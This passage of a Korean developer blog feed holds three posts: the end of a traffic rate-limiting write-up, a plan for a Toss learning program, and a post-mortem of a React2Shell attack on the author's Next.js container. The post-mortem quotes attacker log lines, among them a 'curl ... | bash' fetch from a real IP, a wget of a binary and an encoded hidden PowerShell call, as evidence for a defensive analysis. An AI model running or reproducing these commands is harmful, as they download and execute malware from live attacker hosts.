<p><img src="/assets/images/posts/2026-01/20260109-008.png" alt="" /><br />
<em>Discord Grafana Alert 와 무중단 배포 알림</em></p>

<p><img src="/assets/images/posts/2026-01/20260109-009.png" alt="" /></p>

<p><em>실제 테스트 당시 모니터링 docker stats + btop + k6 화면</em></p>

<h3 id="3-마무리">3. 마무리</h3>

<p>이번 프로젝트를 통해 백엔드 개발자로서 증명해야 할 것이 명확해졌다. 트래픽을 처리할 수 있다면 처리하고, 처리할 수 없다면 시스템은 생존해야 한다. 대용량의 경험을 언제 해볼 수 있을까? 싶지만, 우선 대용량이 아니더라도 서버의 특성에 맞춰 적절하게 대응하는 방법을 배울 수 있던것 같으니… 이걸 기반으로 기회가 올 수 있지 않나 싶다.</p>

<p>Traffic Dam은 그 첫 번째 구현이었고, 용량 산정 공식 도출까지 도달한 점은 의미 있는 성과였다. AI 기반으로 할 때 이런 점에서 좋다고 느낀다. 각 요소에 대한 의미를 놓치지 않게 이야기 하다보면 데이터의 특징이 보인다.</p>

<p>다음 단계로는 DB 최적화, RAG 파이프라인, 프롬프트 엔지니어링 등 AI 서비스의 응용 레이어를 보강할 계획이다. Protostar의 완전체는 구현하기 어려울 것 같지만, 핵심 비즈니스 로직은 내 블로그를 통해 보여지고 실제로 쓸 수 있도록 만들어봐야지.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><category term="Protostar" /><summary type="html"><![CDATA[Chapter 1 Traffic Dam 구현기 summary]]></summary></entry><entry><title type="html">Toss Learner’s High 2기 init report</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2025/12/17/00-til-learnershigh-toss.html" rel="alternate" type="text/html" title="Toss Learner’s High 2기 init report" /><published>2025-12-17T00:00:00+00:00</published><updated>2025-12-17T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2025/12/17/00-til-learnershigh-toss</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2025/12/17/00-til-learnershigh-toss.html"><![CDATA[<h2 id="들어가면서">들어가면서</h2>

<p><img src="/assets/images/posts/2025-12/20251217-022.png" alt="" /></p>

<blockquote>
  <p>본 문서는 과거 React Shell 취약점으로 인한 L7 공격 경험을 바탕으로, ‘고가용성 트래픽 제어 시스템’을 구축하는 과정을 기록한 첫 번째 성장 일지입니다. Kubernetes의 복잡성에서 벗어나 실용적인 Docker 기반 아키텍처로 전환하고, 러너스 하이 2기를 위한 ‘유량 제어 안정성’을 핵심 목표로 설정하여 측정 가능한 기술적 임팩트를 증명하고자 하는 제 1번 기록입니다.</p>
</blockquote>

<h3 id="퇴사">퇴사</h3>

<p>몸의 건강의 문제, 그리고 다음을 준비해야 하는 문제를 포함하여 나의 2024년과 25년은 그야말로 달리는 한 해였다. 42서울의 3년의 시간, 그리고 1년의 서버 개발자로의 활동은 분명 숨고를 틈이 없었다.</p>

<p>숨을 고르는 것, 동시에 지금까지 한 작업들이 꽤나 괜찮은 작업들이었음은 맞다고 생각되나, 몇 가지 아쉬움이 있었다.</p>

<ol>
  <li>‘연차’를 뛰어넘는 개발자가 되고 싶다는 내 생각에 비해 아직 못 미친다는 생각.</li>
  <li>과연 기술적으로 내가 했던 것들이 증명이 된 것이 맞을까?</li>
  <li>AI를 비롯한 신 기술의 ‘응용 개발자’가 되기 위한 발판이 마련되어야 한다. 지금은 업무로 모든 것을 할 시간이 부족하다.</li>
</ol>

<p>개발자로 어느정도 안착은 했지만, 해야할 일, 할 수 있는 일 사이에서의 고민과 좀더 괜찮은 공간, 괜찮은 커뮤니티, 괜찮은 리소스에서 제대로 일하고 싶다는 생각을 해왔고, 마침 회사의 노선 변경을 눈앞에서 지켜보던 찰나, 내가 할 수 있는 선택과 결단이 필요하단 생각이 들었기에 퇴사를 하고 프로젝트를 진행하기로 마음을 먹게 된다.</p>

<p><img src="/assets/images/posts/2025-12/20251217-023.png" alt="" /></p>

<p>그리하여 시작한 것이 퇴사 후 Project Protostar AI 기반의 챗봇 서비스의 구현이었다.</p>

<h3 id="한계-봉착-하지만-그럼에도-발견한-새로운-가능성">한계 봉착. 하지만 그럼에도 발견한 새로운 가능성</h3>

<p>Project Protostar 의 시스템 검증, n8n 을 기반으로 한 AI PoC 구축은 생각보다 너무 쉽게 이루어져 갔다. 바이브코딩 역시 한몫을 했는데, 특히나 Antigravity, PRD 구조의 수동 구축 및 AI 적용 등을 통해 AI 가 개발의 보조 역할을 톡톡히 해준다는 점은 지울 수 없는 특이점이었고, 단 수일로 프로젝트의 FE, BE 틀 까지는 만들 수 있었다.</p>

<p>하지만 문제가 있었으니.. 그것이 바로 DevOps 의 영역에 대한 문제였다. CI나 CD 는 Jenkins와 ArgoCD 기반으로 어떻게 하는지를 배우고 나니 생각 이상으로 빠르고 명료하게 해내갈 수 있었고, 에러가 발생했을 때 어떻게 하면 될지도 느낄수 있었는데… 문제는 K8s 의 적용에 있었다.</p>

<p><a href="https://paul2021-r.github.io/%ED%95%99%EC%8A%B5/2025/12/05/00-til-change-plan.html">TIL - 11월, K8s 실패 + Docker 환경으로의 전환 정리</a> 이 글에서도 디테일 하게 정리했었지만… k8s 실무 버전을 위해선 중요한 게 failover 와 self-healing 을 위한 일종의 전체 패키지의 구축된 이미지들의 덩어리를 차트 형태로 가져갔으며, 이 차트들은 제각기 다른 의존성과, 설정으로 아주 예민하게 묶여 있었다. 문제는 그런 시스템을 혼자서 개발하려고 했단 것 자체가 엄청난 문제였고, 쏟아지는 버그와 러닝커브를 내 프로젝트 기간 내에 전부 녹여 낼 수 있으리란 생각이 들지 않았다. 심지어 AI 조차도 학습된 시차가 존재하는데, 문제는 그 학습이 ‘버전 별 차이’를 가지고 하는게 아니라, 과거 버전의 혼합된, 그리고 현재의 구성요소는 제대로 인지도 못하고 있는 상황이었다. (ChatGPT, Claude, Gemini 모두다). 결국 이 영역의 현업에서 사용하기 어려운 수준의 버전을 쓰는 꼴이었고, 그 마저도 제대로 현재의 정책이 달라져 헬름 차트 공개 위치가 달라지는 등의 문제를 그대로 않고 있었다.</p>

<p>특히 가장 핵심은 ‘URL’ 과 같은 유니크한 정보였다. AI 의 본질이 확률, 가능성을 기반으로 형성된 확률 계산기인 만큼, 사실 엄청난 양의 패러미터 사이즈를 가진다고 해도, 여기서 문제는 그것이 ‘정확한 정보’ 이냐 반대로 ‘그럴듯한 정보’냐 라는 지점이 문제시 된다. 그리고 실제로도 그 문제로 오히려 더 많은 시간을 소모했다. 헬름 차트 URL 을 못찾아 온다거나, 정책이 바뀌어 오픈하지 않는 경우 등이 이에 해당되었다.</p>

<p>결국 이러한 상태로 지지부진한 것은 프로젝트 전체를 위해 도움이 되지 않는 다고 판단했다. 못하는 건 다시 배우면 된다 치고, 러닝 커브는 돌파하기 어렵다면 지금은 우선 가능한 최선의 선택을 할 뿐이었다.</p>

<h3 id="토스-그리고-focus-on-impact">토스 그리고 Focus On Impact</h3>

<p>그리하여 어떻게 어떻게 다시 프로젝트를 이어 가던 도중, 갑작스럽게 링크드인을 통해 이런 공고를 볼 수 있었다.</p>

<p><img src="/assets/images/posts/2025-12/20251217-024.png" alt="" /></p>

<p>러너스 하이? 스스로의 성장을 증명하라? 해당 포인트는 너무나 완벽하게 나에게 부합하는 부분이었다. 거기다 작업하는 과정에서 고민이 되는 것이 있었다.</p>

<ul>
  <li>이전에 설명했듯, 구상과 구현이 어떻게 하면 되는지 다 아는데, 핵심인 k8s 를 내려놓고 개발만 하는게 맞을까?</li>
  <li>그리고 이러한 전체를 구현하는 것은 정말로 내가 개발자 스러운 전문성을 확보하는 걸까?</li>
  <li>나의 증명을 하겠다고 했지만, 과연 나 혼자만의 북치고 장구치고가 된다면 그건 증명이 맞을까?
이러한 질문들은 꼬리를 약간 물고 있었는데, 그러던 와중에 보인 이 광고. 그리고 정말 심플하게 적혀져 있는 토스의 문구는 나를 자극하기 충분했고, 노려볼만 하겠구나 라는 생각을 할 수 있었다.</li>
</ul>

<blockquote>
  <p>“결국, 시작이 반이라고 일단 할 수있는 최대한 빨리 지원하자!”</p>
</blockquote>

<p>이런 결정이 든 순간, 프로젝트를 약 3일 정도 멈추고, 최대한 빨리 이력서와 경력 기술서를 작성 했고, 놀랍게도…</p>

<p><img src="/assets/images/posts/2025-12/20251217-025.png" alt="" /></p>

<p>기회가 찾아왔다</p>

<h2 id="그래서-뭘-하지">그래서 뭘 하지?</h2>

<h3 id="focus">Focus</h3>

<p>기회를 받아냈다.
검증할 기회.
집중할 수 있는 기회.
도망칠 수 없는 기회.</p>

<p>기쁘지만 동시에 이젠 진짜 구나 라는 실감이 프로젝트를 홀로 할 때보다 확실하게 들었고, 특히나 오리엔테이션이 끝나고 나서, 한달이란 시간 내에 어떤 걸 해보면 좋을까? 에 대한 생각은 내 머릿속을 관통했다.</p>

<p>그리곤 오리엔테이션의 내용과 함께 1기에 먼저 참가했던 분들의 후기들, 그리고 그 속에서 나는 어떤 걸 해야 할까? 고민하게 되었다. 특히나 가이드를 통해, 서버의 헤드이자 연사로 나온 이항렬님의 이야기를 들으면서 다시 생각해보기 시작했다.</p>

<p>Project Protostar 를 물론 만드는 것도 중요하다. 증명한다면 좋겠지. 하지만 지금은 한달이란 기간의 극적인 효과를 낼 수 있어야 할 것이고, 특히나 스스로 성장할 포인트를 잡고 ‘완수’ 해내는 것이 너무나 중요하다. 하지만 실상 본질은 아니었다. 엄밀히 말하면 만들어 내든 안내든 그게 무슨 의미인가? 그것이 전문가가 되기 위한 명확한 근거가 되는가?</p>

<p>코드의 가치는 AI 를 통해 한없이 낮아졌다. 결국 그것이 날 대표할 순 없고, 나의 실무적 가치는 그것을 넘어서야 하는 거고, 그렇게 하기 위핸 더 깊은 어딘가, 실무에서든 어디에서든 분명하게 스스로 문제를 규정하고 풀어내고, 그 속에서 결과를 만들어내는 것이 기획자도 아니고, 프론트엔드 개발자도 아닌 내가 만들어낸 얄팍한 서비스를 들이밀며 ‘난 백엔드 개발자야’ 라고 이야기 할 순 없지 않겠는가?</p>

<h3 id="problem">Problem…?</h3>

<p>그러다 문뜩, 내 블로그에 적었던 나의 글이 떠올랐다. 기록하고 프로젝트를 다 하곤 보완하리라 생각하고, 현재는 응급 처치를 해둔 보안 결함성 문제.</p>

<ul>
  <li><a href="https://paul2021-r.github.io/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html">TIL - 내 컴퓨터가 채굴기가 될 뻔했…지만 해결기</a></li>
</ul>

<p>React2Shell 이라는 문제로 인해 NextJS 15 이상, React 19 이상인 프론트엔드 서버에서 내부에서 서버에 공격을 가하는 것이었으며, CPU 자원을 800% 나 끌어다 썼던 일. 방법이야 어찌 되었던 간에 L7 의 공격이 들어올 때 Rate Limiter 의 부재를 비롯, 여러 면에서 Traffic Dam 이 없었다는 점에서 공격을 허용한다는 것은 백엔드 개발자이자, 백엔드 인프라 차원에서 해결할 수 있어야 하지 않았을까?</p>

<p>그렇게 생각하니 퍼즐이 머릿속에서 맞춰지는듯 했다. 그렇다 내가 원하는 건 <strong>물론 이것 저것 다 재밌게 잘 하는 것</strong>도 재밌을 것이다. 하지만 더 중요한건, <strong>본질은 내가 서버 개발자이며, 서버 개발자로서 실무적으로도, 본질적으로도 해야할 일을 심화 하는 것</strong>. 그것이 얄팍한 올라운더보다 현재 가장 중요한게 아니겠는가?</p>

<p>그리하여 해야할 일을 몇 가지로 추려 보았다.</p>

<ol>
  <li>대기열 순서 보장</li>
  <li>유량 제어 안정성</li>
  <li>장애 복원력
그러나 여기서 React2Shell 같은 케이스가 발생 시 백엔드 서버에서 직접적인 해결책이 되기도 하며, 현재 상황에서 가장 현실적인 플랜으로 생각할 때 2번을 성공적으로 달성해 내는 것이 어떨까! 싶었기에 그것을 구현해 내려고 한다.</li>
</ol>

<h3 id="그렇다면-증명하고-구현할-것들의-로드맵은">그렇다면 증명하고 구현할 것들의 로드맵은?</h3>

<table>
  <thead>
    <tr>
      <th>주차</th>
      <th>목표</th>
      <th>핵심 작업</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>**1주차**</td>
      <td>MVP + Baseline 측정</td>
      <td>챗봇 API 연결, **"Dam 없는 상태"에서 부하 테스트 → Before 수치 확보**</td>
    </tr>
    <tr>
      <td>**2주차**</td>
      <td>Traffic Dam 핵심 구현</td>
      <td>Rate Limiter (Token Bucket) + BullMQ 대기열 + Backpressure 로직</td>
    </tr>
    <tr>
      <td>**3주차**</td>
      <td>스트레스 테스트</td>
      <td>k6로 5,000 RPS 공격 시뮬레이션, **Dam 있는 상태 → After 수치 확보**</td>
    </tr>
    <tr>
      <td>**4주차**</td>
      <td>비교 분석 + 문서화</td>
      <td>Before/After 그래프, Grafana 대시보드 캡처, 성장 일지 마무리</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p><strong>“초당 5,000개의 악의적 요청이 들어와도, 백엔드는 초당 100개만 처리하며 죽지 않는다”</strong></p>
</blockquote>

<p>챗봇, 특히 LLM 은 이용하기에 좋은 먹잇감이며, 특히나 그 구조 상 AI 를 혹사 시킬 수도 있다. 그러다보니 프론트엔드에서 제한을 걸긴 하지만, 그럼에도 API 사용 시 제한으론 부족함도 있었다. 그렇다면, 내 API 비용(?) 을 포함 여러가지를 지켜낼 수 있는 것들을 위의 일정을 거쳐 구현해내고 검증하면 어떤가? 하고 생각했다.</p>

<p>Docker를 기반으로 Grafana, Prometheus, exPorter, cAdvisor, loki-promtail이 설정 되어있다. 배포도 준비 되어 있고, 챗봇도 일단 겉 모습은 되어 있으니 그걸 그대로 쓴다면? 현재의 문제를 묘사해보고, 실제 그런 일이 발생시 버틸 능력을 기른다. 이것은 어쩌면 광활하고 얕은 프로젝트를 마무리 짓기 보다 우선시 하는게 낫지 않겠는가!</p>

<h4 id="기술적-base-why">기술적 Base why</h4>

<p>해당 Traffic Dam  아키텍쳐를 구현하는 것은 기존에도 Protostar 프로젝트의 Polyglot 구조를 그대로 차용할 것이다. 이는 AI의 작업에 맞는 프레임워크와 웹 서버 본질에 충실한 NestJS 를 혼용함으로써 각각의 장점을 극대화 하려는 측면이 있기 때문이다. 특히나 두 서비스의 Redis 기반의 느슨한 결합을 통해 하드웨어적으로 모니터링과 서비스를 단일지점장애가 발생하지 않도록 설계하였듯, 각각의 컨테이너도 서로의 장애가 전파되지 않도록 할 것이다.</p>

<h4 id="측정-계획은">측정 계획은?</h4>

<p>로드맵에 나온 측정은 아직 완벽하게 어떤 툴을 쓸지를 정한 것은 아니다. 그럼에도 구체적으로 고민과 진득한 AI와의 씨름 끝에 합당할 만한 수치들을 정리해보면 다음과 같았다.</p>

<ol>
  <li>시스템 안정성 : ‘시스템이 공격을 버티는 가’
    <ul>
      <li>에러율(Error Rate)</li>
      <li>성공적 요청 처리량(Worker TPS)</li>
      <li>서버 재시작 횟수(OOM)</li>
    </ul>
  </li>
  <li>리소스 효율성 : ‘얼마나 효율적으로 버텨내는가?’
    <ul>
      <li>CPU 사용률(CPU Usage %)</li>
      <li>메모리 사용률(Memory Usage)</li>
      <li>FD 사용량: 해당 수치는 다만 간단한 구현 과정에서 의미가 없을 수도 있다고 생각함</li>
    </ul>
  </li>
  <li>사용자 경험 및 큐 성능
    <ul>
      <li>API 응답 시간(Latency)</li>
      <li>대기열 길이(Queue Length)</li>
      <li>평균 대기시간(Avg. Wait Time)</li>
    </ul>
  </li>
</ol>

<h4 id="리스크--가정">리스크 &amp; 가정</h4>

<p>단 생각해보니 현재는 AWS 구축을 고려한 설계와 호환성을 갖춰둔 구조를 취하고 있지만, 그럼에도 온프레미스 라는 점을 감안할 때 몇가지 가정이 필요하다는 생각은 들었다.</p>

<ol>
  <li>온프레미스 환경에서 모니터링과 서비스 서버 각 1대가 별도의 네트워크로 HTTPS, HTTP 를 모두 할당 받은 상태이므로 기본적으로 연결에서 안정성은 문제가 없다.</li>
  <li>현재의 온프레미스 서버는 기본적으로 라이젠 칩셋이 탑재된 40GB 의 메모리를 가진 서버로, 일반적인 서버 리소스보다 매우 넉넉한 환경을 갖고 있으며 이를 고려한 고 가용성 테스트로 수치를 점점 늘려 나갈 것이다. (반대로 서버의 성능을 제한을 걸어 테스트를 해야할 필요도 있어 보인다. 더 제약이 걸린 리소스 상태로 최대 처리를 재는게 더 현실적일 순 있으니)</li>
  <li>아주 최악의 상황일 수 있는 것으로 공유기가 한계치에 부딪힐 수 있다는 점인데, 현재의 상황은 다음과 같다.
    <ul>
      <li>WIFI 7을 지원하는 최신 성능의 칩셋 탑재 공유기 사용중</li>
      <li>해당 공유기의 리소스를 최소화하고자 해당 공유기는 모두 유선 연결이 기본이며, 집의 wifi 는 메인 공유기에서 쓰지 않고 서브 공유기를 통해 수행되어, 리소스 사용을 오로지 서비스 자체에 집중한다. (AP 모드)</li>
      <li>만약 공유기가 먼저 문제가 발생한다면, 이 역시 Docker 자체의 하드웨어를 제약을 걸어 놓고, 이를 기반으로 적용된 Traffic Dam 로직을 기반으로 얼마나 성능과 지표가 나오는지를 본다.</li>
    </ul>
  </li>
  <li>위의 점을 기반으로 볼 때, 핵심은 주어진 단일 노드의 물리적 한계 내에서 소프트웨어 아키텍처 만으로 어디까지 트래픽을 제어할 수 있는지 증명하는 것이기에, 네트워크 지연, 분산 시스템의 복잡성은 제외한다.</li>
</ol>

<h2 id="결론">결론</h2>

<p>너무나 감사하게도 1차적으로 선발될 수 있었기에, 그 기회를 제공 받았단 말 만으로도, 나의 노력들이 헛으로 쓰이진 않았구나 라는 생각을 할 수 있었다. 1년간 치열하고 치밀하게 달려온 것들, 정리한 것들이 결국 다 나의 경험이자 가치이며, 내가 개발자로 살아갈 수 있구나를 토스가 다시 한 번 검증해준 것 같아 기분이 좋았다.</p>

<p>결국 실력의 검증, 그 실력의 증명을 내 나름의 방식으로 해결했단 것이고, 이걸 기반으로 확장해 나가면 되지 않겠는가? 그리고 그런 와중에 새롭게 해야할 일을 빠르게 찾아갈 수 있었고, 그 목표 역시 지금 내가 판단할 방법은 없지만, 분명 토스가 원하는 것에 합당하리라 생각이 들었다.</p>

<blockquote>
  <p>정형화된 방식을 그대로 따르기 보다,
각자의 환경에 맞는 최적의 해답을
스스로 탐색해나가는 시간</p>
</blockquote>

<p>러너스 하이 2기의 내부 내용은 공개할 수도 없고, 애초에 평가 방식이라던가 이런 미공개인 관계로 나도 모르지만, 어쨌든 이 문제를 개선해보고 직접 로깅하고 데이터를 비교하면서 제대로 백엔드를 구현해낸다면? 어쩌면 다음 단계의 내 모습이 나를 기다리고 있으니 해야 할 일은 정해져 있었다. 제한된 리소스를 최대한 활용하고, 활용한 결과를 냉정하게 분석하고 개선한다.</p>

<p>턱 밑까지 숨이 차오를 수 있도록, 그리하여 달리다가 서서히 아픔이 사라지고, 끈덕지게 문제를 해어 나가는 과정에서 새로운 지평선이 보일 수 있도록.</p>

<p>노력해야겠다.</p>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="Backend" /><category term="개발" /><summary type="html"><![CDATA[들어가면서]]></summary></entry><entry><title type="html">TIL - 내 컴퓨터가 채굴기가 될 뻔했….지만 해결기</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html" rel="alternate" type="text/html" title="TIL - 내 컴퓨터가 채굴기가 될 뻔했….지만 해결기" /><published>2025-12-09T00:00:00+00:00</published><updated>2025-12-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/12/09/00-til-react2shell-attack.html"><![CDATA[<h2 id="내-컴퓨터가-채굴기가-될-뻔했지만-해결기">내 컴퓨터가 채굴기가 될 뻔했….지만 해결기</h2>

<p><img src="/assets/images/posts/2025-12/20251209-020.png" alt="" /></p>

<p>개인 프로젝트를 진행하다가 갑자기 프론트엔드 서버가 동작하지 않는 것을 발견하였다. 백엔드 서버도 문제없이 돌아가고 있었고, 이미 기존에 충분히 안정성을 검증했던 거라, 갑자기 안된다는 것에 이상함을 감지하고 Grafana와 Docker logs 를 뒤져보기 시작했다. 그런데…</p>

<p><img src="/assets/images/posts/2025-12/20251209-013.png" alt="" /></p>
<blockquote>
  <p>응….? 800%?</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251209-014.png" alt="" /></p>
<blockquote>
  <p>엥?</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251209-015.png" alt="" /></p>
<blockquote>
  <p>에에엥?</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251209-016.png" alt="" /></p>
<blockquote>
  <p>컨테이너를 다시 켜면서 로그는 여기까지…</p>
</blockquote>

<p>뭔가 쎄한 감정이 드는 순간, 여기저기서 오는 메일, 알림. 털렸다는 소식이 들려오기에 우선 제일 먼저 로그부터 까보기로 했다. 그러자 몇 가지 단적인 문제 포인트들을 찾을 수 있었다.</p>

<h3 id="로그-분석-결과-해킹-시도-증거">로그 분석 결과: 해킹 시도 증거</h3>

<p>로그 곳곳에 공격자가 서버를 장악하고 악성 스크립트를 실행하려 한 흔적이 있었다.</p>

<ul>
  <li><strong>외부 IP 연결 시도:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Connecting to 193.34.213.150</code></li>
      <li><code class="language-plaintext highlighter-rouge">curl http://45.134.174.235:443/2.sh | bash</code></li>
      <li>이 IP들은 공격자가 악성 파일을 호스팅하는 C&amp;C(Command &amp; Control) 서버인지는 알 수 없지만, 확실한건 수십차례, 수시간 동안 계속 연결을 시도했다.</li>
    </ul>
  </li>
  <li><strong>악성 파일 다운로드 및 실행 시도:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">wget: can't open 'x86': File exists</code>:  <code class="language-plaintext highlighter-rouge">x86</code>이라는 파일을 다운로드하려 했다.</li>
      <li><code class="language-plaintext highlighter-rouge">/dev/health.sh</code>: 일반적인 Next.js 컨테이너에는 존재하지 않는 경로의 쉘 스크립트, 아마도 health 로 볼 때, 다른 보안 프로그램 등에서 문제 없다고 넘어갈 수있게 만드려는 도구가 아닐가 추정된다.</li>
    </ul>
  </li>
  <li><strong>공격 페이로드 (Payload):</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -enc ...</code>: Base64로 인코딩된 파워쉘 명령어를 실행하려 했다.</li>
      <li><code class="language-plaintext highlighter-rouge">wow i guess im finna bridge now... MEOWWW...</code>: 스크립트 키디(Script Kiddie)나 특정 봇넷이 남기는 시그니처 메시지입니다.</li>
    </ul>
  </li>
</ul>

<p>CPU 사용량 800% 를 찍었고, 서버가 뻗을 뻔 했지만 살아는 있었다. 그렇기에 얼른 컨테이너 이미지와 볼륨을 새로 정리한 뒤, 우선 해결책으로 방법을 찾아 다녔다.</p>

<h3 id="해결-다행이-빠르게-해결-된다-하지만-주의사항">해결: 다행이 빠르게 해결 된다. 하지만 주의사항</h3>

<p><img src="/assets/images/posts/2025-12/20251209-017.png" alt="" /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npx fix-react2shell-next
</code></pre></div></div>

<p>다행이 사용하는 기술 스택이 next 였기도 하고, next 역시 빠르게 대응 빌드를 올리게 되면서, 해당 명령어만 치면 문제는 해결 된다고 했다.
하지만 이렇게 될 경우 문제가 있는데 그것은 바로 호환성 관련된 영역이다.</p>

<p><img src="/assets/images/posts/2025-12/20251209-018.png" alt="" /></p>

<p>빌드 및 자동배포가 터졌고 로그를 확인해 보았다. 왜 그런가 알아보니, next 기반인  react 와 eslint 는 next에 대응되는 버전이 필요하였고, 버전이 안 맞으면 빌드 시 터지는 것이었다. 하물며 어이없게도 next 공식 보안 패치 명령어는 이러한 문제를 해결해주지 않는 것을 (…) 알게 되었다.</p>

<p>프론트엔드 개발자는 아니기 때문에 내가 몰라서 그랬던 건지는 모르겠지만, 이렇게 package.json 의 버전을 바꿔주면 비로소 해결 되는 것을 알 수 있었다.</p>

<h3 id="흠-근데-희한하네-왜-괜찮았지">흠 근데 희한하네… 왜 괜찮았지?</h3>

<p>그리하여 정리하고 배포를 다시 안전하게 하고, 하는 김에 Jenkins 잡까지 다듬어서, 정리를 했는데 왜 이런 일이 터졌고, CPU 사용량 800% 로 뚫은 것도 사실인데, 반대로 로그를 뒤져본 결과 공격이 실패했고, 동시에 왜 다른 서버는 쌩쌩하게 살아있던거지? 라는 생각이 들어 로그와 내용을 좀 분석 해볼 필요가 있다고 느꼈다.</p>

<h4 id="무엇이-문제를-키웠나">무엇이 문제를 키웠나?</h4>

<ul>
  <li><strong>취약점은 답이 없다</strong> : 근본적으론 보안 구멍이 발생한 것 자체가 문제기는 했다. 종단간 암호화에 프록시 까지 잘 앞에 세워뒀었고, 그정도면 어지간하면 문제가 없어야 하는데 당장에 구멍이 뚫려있으니… nextjs 자체가 쉘로 동작하고 명령어를 실행시키는 것은 정말 충격적이었다.</li>
  <li><strong>Rate Limiter &amp; WAF 의 부재</strong> :
    <ul>
      <li>내 핵심 문제 사항이라고 볼 수 있는데… 개발과정에 있다보니 해당 보안 처리를 아직 설정을 안한 상태였다.</li>
      <li>로그를 디테일하게 파보니 Next.js 의 취약점을 이용해 L7 레이어 공격이라 네트워크 방화벽 L3/L4 를 우회했고, 이 와중에  <code class="language-plaintext highlighter-rouge">child_process.exec()</code> 이나 <code class="language-plaintext highlighter-rouge">spawn()</code> 을 호출한 것으로 보였다.</li>
      <li>그리고 <code class="language-plaintext highlighter-rouge">wget: can't open 'x86x: File exists</code> 라는 메시지도 있었는데 이는 ‘이미 파일이 있다’는 에러이고 이런 점에서 감안하면 다음과 같은 상황으로 추론이 되었다.
        <ol>
          <li>첫번째 다운로드 성공한게 아닌가 싶다.</li>
          <li>하지만 성공한 프로그램이 제대로 구동 안됨</li>
          <li>계속 다운로드 시도 및 프로세스 생성 -&gt; 프로세스가 계속 발생하면서 처리가 필요했고 그 과정에서 800% 이용률 발생</li>
          <li>하지만 시도한 방법 자체가 대단히 심플한 명령어 수행 요청이었고, 좀비 스레드가 생성될 순 있겠지만 그것이 시스템의 제어를 망가뜨릴 정도까지는 가지 못했다- 는 점을 알 수 있었다.</li>
        </ol>
      </li>
      <li>따라서, 결과적으로 Rate Limiter 와 WAF 를 통해 지능적으로 문제 시 될 요청을 제한했다면 아주 완벽한 보안이 되지 않을까 한다.</li>
    </ul>
  </li>
</ul>

<h4 id="그런데도-불구하고-털리지-않은-점은">그런데도 불구하고 털리지 않은 점은?</h4>

<ul>
  <li>그럼에도 신기하게 서버 통으로 문제가 발생하진 않았었다. 이유는 무엇인가?</li>
</ul>

<ol>
  <li><strong>플랫폼 차이</strong> : 로그를 보니 <code class="language-plaintext highlighter-rouge">powershell -nop -w hidden -enc ...</code> 이런 로그가 눈에 들어왔는데, 즉, 공격자는 윈도우 서버를 공격할 목적이 다분해 보였다. 아마도 시스템 권한이나, 자원 사용에 있어서 윈도우즈 보안이 뚤릴 것을 노린게 아닌가 싶은데… 애석하게도 리눅스 시스템으로 가능한 보안적으로 든든한 Ubuntu LTS 버전, 보안패치를 짱짱하게 받은 상황이니 다행이라고 볼 수 있겠다.</li>
  <li><strong>경량형 이미지와 온전한 컨테이닝</strong> : 로그 중에 <code class="language-plaintext highlighter-rouge">/bin/sh: curl: not found</code>, <code class="language-plaintext highlighter-rouge">/bin/sh: bash: not found</code> 이런게 보였다. 여기서 나름 뿌듯함을 느꼈다. 개발 하는 시점부터 써야 하는 이미지는 리소스를 최대한 줄이며, 완벽하게 하나의 역할에 맞춰 설계를 하는게 낫다- 고 생각했는데 이번 사건이 그 아주 좋은 경험이었다. 다른 작업을 하는데 필요한 도구들에 접근 자체가 불가능했고, 권한이 없는 상태에서 할 수 있는 최선의 시작점이 실행이 안되니 입구 앞에서 아무것도 할 수 없었던 것이다. 이러한 전략을 <code class="language-plaintext highlighter-rouge">공격 표면 축소(Attack Surface)</code> 라는 방법론이라고 한다는데</li>
</ol>

<p>이렇듯, 의도치 않게 1 스트라이크, 1 아웃을 경험하였고, 다행이 도구들이 준비되고, 무중단 배포나 모니터링이 얼추 되어 있다보니 다행이 문제를 해결할 수 있었다. 그리고 동시에 전에 사수가 이야기 했던 공격에 대한걸 떠올리면서, 역시 라이브 서비스는 기본 타협없이 반드시 지켜야 할 것들을 지켜 놓는게, 신상에 이롭다는 사실을 이해할 수 있었다.</p>

<p>동시에 당초 목표로 AWS 호환 되도록 인프라를 설계 했었고, 만약 클라우드(AWS, Azure 등)의 오토스케일링 환경이나 종량제 과금 모델을 쓰고 있었다면, 이번 CPU 800% 폭주로 인해 이번 달 서버 비용으로 컴퓨터 한대 해먹지 않았을까? (…) 여러 모로 교훈이 되는 경험을 하지 않았나 싶다. 그리고 동시에 얼마나 털기 쉬우면 윈도우로 채굴 같은걸 하려고 했는지는 모르겠지만… 서버로 윈도우를 쓰는 건 자제하자는 나름의 교훈(?) 도 하나 얻어 가는 것 같다.</p>

<p>요 최근 쿠팡도 그렇고, 통신사들도 그렇고, 보안 신경… 정말 스스로 조심하는 것도 중요하고, 무엇보다 회사에서 사고치지 않도록 이부분은 타협하지 말아야 한다는 점.. 명심해야겠다. (라는 생각에 따라 오늘 작업은 우선 nginx 앞에 SafeLine 이라는 WAF 를 하나 세워 둬야겠다…)</p>

<p><img src="/assets/images/posts/2025-12/20251209-019.png" alt="" />
